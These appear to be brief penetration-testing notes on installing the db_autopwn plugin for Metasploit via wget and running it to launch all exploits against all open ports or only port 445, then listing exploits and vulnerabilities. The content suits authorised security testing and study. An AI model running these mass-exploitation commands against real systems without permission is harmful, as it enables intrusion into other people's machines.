#### Plugins
 - wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
 - sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins
 #### Metasploit
 - msfconsole
 - load db_autopwn
 - db_autopwn [ this also show the usage command for that ]
 - db_autopwn -p -t [ it's run all the exploit for all open ports ]
 - db_autopwn -p -t -PI 445 [ only exploit port 445]
 - analyse [ shows all the exploit can be used for exploitation ]
 - vulns [ list the vulnerabilities ]


